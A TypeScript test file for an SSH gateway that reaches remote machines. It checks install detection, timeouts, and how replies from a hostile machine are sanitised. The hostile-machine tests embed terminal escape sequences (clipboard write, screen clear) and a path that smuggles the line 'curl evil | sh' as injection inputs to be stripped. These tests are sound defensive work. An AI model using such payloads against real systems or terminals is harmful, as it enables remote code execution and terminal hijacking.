import { describe, expect, it } from 'bun:test';
import type { RpcRequest } from '@favo/contracts/rpc/envelope';
import { ReplyingSsh } from '#test/support/replying-ssh';
import { Ssh } from '@/modules/machines/gateways/ssh';
import { SshRemoteBackends } from '@/modules/machines/gateways/ssh.remote-backends';

class ExitingSsh extends Ssh {
  command = '';

  constructor(
    private readonly code: number,
    private readonly stderr: string
  ) {
    super();
  }

  async exec() {
    return { code: 0, stdout: '', stderr: '' };
  }

  async upload() {
    return { code: 0, stdout: '', stderr: '' };
  }

  open(_target: string, command: string) {
    this.command = command;
    return {
      write() {},
      onLine() {},
      exited: Promise.resolve({ code: this.code, stderr: this.stderr }),
      kill() {},
    };
  }
}

const windowsBox = { id: 'winbox', name: 'winbox', target: 'bee@winbox', isLocal: false, system: 'windows' } as const;
const unixBox = { id: 'devbox', name: 'devbox', target: 'bee@devbox', isLocal: false } as const;
const ping = { id: 1, method: 'system.ping', params: {} };

describe('reaching a machine', () => {
  it('starts the right binary for each system', async () => {
    const ssh = new ExitingSsh(1, '');
    await new SshRemoteBackends(ssh).request(windowsBox, ping).catch(() => undefined);
    expect(ssh.command).toBe('.favo\\bin\\favo.exe serve --stdio');
    await new SshRemoteBackends(ssh).request(unixBox, ping).catch(() => undefined);
    expect(ssh.command).toBe('~/.favo/bin/favo serve --stdio');
  });
  it('sees favo missing on Windows in any language, because cmd translates its error', async () => {
    const portuguese = "'.favo\\bin\\favo.exe' não é reconhecido como um comando interno";
    const backends = new SshRemoteBackends(new ExitingSsh(1, portuguese));
    await expect(backends.request(windowsBox, ping)).rejects.toMatchObject({ code: 'machineNeedsInstall' });
  });
  it('still tells a dropped connection from a missing favo on Windows', async () => {
    const backends = new SshRemoteBackends(new ExitingSsh(255, 'Connection timed out'));
    await expect(backends.request(windowsBox, ping)).rejects.toMatchObject({ code: 'machineUnreachable' });
  });
  it('sees favo missing on Unix', async () => {
    const backends = new SshRemoteBackends(new ExitingSsh(127, 'favo: not found'));
    await expect(backends.request(unixBox, ping)).rejects.toMatchObject({ code: 'machineNeedsInstall' });
  });
});

describe('a hostile machine', () => {
  const Sequence = '\u001b]0;title\u0007\u001b]52;c;Y3VybA==\u0007\u001b[2J\u009b31m';
  const Plain = ']0;title]52;c;Y3VybA==[2J31m';

  function answering(result: unknown) {
    return (request: RpcRequest) => JSON.stringify({ id: request.id, ok: true, result });
  }

  it('cannot put a control character in any string of a result', async () => {
    const result = { directory: `/srv${Sequence}`, seats: [{ path: '/h/.claude\ncurl evil | sh\n' }] };
    const backends = new SshRemoteBackends(new ReplyingSsh(answering(result)));
    expect(await backends.request(unixBox, ping)).toEqual({
      id: 1,
      ok: true,
      result: { directory: `/srv${Plain}`, seats: [{ path: '/h/.claudecurl evil | sh' }] },
    });
  });
  it('cannot put one in a key, which a schema error would quote', async () => {
    const backends = new SshRemoteBackends(new ReplyingSsh(answering({ [`key${Sequence}`]: 1 })));
    expect(await backends.request(unixBox, ping)).toMatchObject({ result: { [`key${Plain}`]: 1 } });
  });
  it('cannot put one in an error message', async () => {
    const reply = (request: RpcRequest) =>
      JSON.stringify({ id: request.id, ok: false, error: { code: 'internal', message: `boom${Sequence}` } });
    const backends = new SshRemoteBackends(new ReplyingSsh(reply));
    expect(await backends.request(unixBox, ping)).toMatchObject({ error: { message: `boom${Plain}` } });
  });
  it('cannot put one in the stderr that explains a dropped connection', async () => {
    const stderr = `banner\nPermission denied${Sequence}\r\n`;
    const backends = new SshRemoteBackends(new ExitingSsh(255, stderr));
    await expect(backends.request(unixBox, ping)).rejects.toMatchObject({
      code: 'machineUnreachable',
      message: `devbox: Permission denied${Plain}`,
    });
  });
  it('leaves a result without control characters exactly as it was', async () => {
    const result = { path: 'C:\\Users\\bêe', count: 2, isOn: true, nothing: null };
    const backends = new SshRemoteBackends(new ReplyingSsh(answering(result)));
    expect(await backends.request(unixBox, ping)).toEqual({ id: 1, ok: true, result });
  });
  it('cannot crash the reader with JSON nested too deep to walk', async () => {
    const deep = `${'['.repeat(1_000_000)}${']'.repeat(1_000_000)}`;
    const ssh = new ReplyingSsh((request) => (request.params ? deep : undefined));
    const backends = new SshRemoteBackends(ssh, 20);
    await expect(backends.request(unixBox, ping)).rejects.toMatchObject({ message: 'devbox did not answer.' });
  });
});

describe('a connection that fails', () => {
  it('is closed when a request times out, and a request in flight fails with it', async () => {
    const ssh = new ReplyingSsh(() => undefined);
    const backends = new SshRemoteBackends(ssh, 10);
    const results = await Promise.allSettled([backends.request(unixBox, ping), backends.request(unixBox, ping)]);
    expect(results.map((result) => result.status)).toEqual(['rejected', 'rejected']);
    expect(ssh.killed).toBe(1);
    await backends.request(unixBox, ping).catch(() => undefined);
    expect(ssh.opened).toBe(2);
  });
  it('gives a count of tokens longer, because it reads every log on the machine', async () => {
    const ssh = new ReplyingSsh(() => undefined);
    const backends = new SshRemoteBackends(ssh, 10, 80);
    const count = { id: 1, method: 'usage.tokens', params: { isFresh: true } };
    let failure: unknown;
    const counting = backends.request(unixBox, count).catch((error) => {
      failure = error;
    });
    await Bun.sleep(40);
    expect({ failure, killed: ssh.killed }).toEqual({ failure: undefined, killed: 0 });
    await counting;
    expect(failure).toMatchObject({ code: 'machineUnreachable' });
  });
  it('does not wait that long for the record a machine already keeps', async () => {
    const ssh = new ReplyingSsh(() => undefined);
    const backends = new SshRemoteBackends(ssh, 10, 60_000);
    const stored = { id: 1, method: 'usage.tokens', params: { isFresh: false } };
    await expect(backends.request(unixBox, stored)).rejects.toMatchObject({ code: 'machineUnreachable' });
  });
  it('keeps the connection while replies arrive', async () => {
    const ssh = new ReplyingSsh((request) => JSON.stringify({ id: request.id, ok: true, result: {} }));
    const backends = new SshRemoteBackends(ssh, 50);
    await backends.request(unixBox, ping);
    await backends.request(unixBox, ping);
    expect({ opened: ssh.opened, killed: ssh.killed }).toEqual({ opened: 1, killed: 0 });
  });
  it('says what happened, even on Windows where other exits mean favo is missing', async () => {
    const ssh = new ReplyingSsh(() => undefined);
    const request = new SshRemoteBackends(ssh).request(windowsBox, ping);
    ssh.exit({ code: 143, stderr: '', failure: 'a line passed the 16777216 byte limit' });
    await expect(request).rejects.toMatchObject({
      code: 'machineUnreachable',
      message: 'winbox: a line passed the 16777216 byte limit',
    });
  });
});
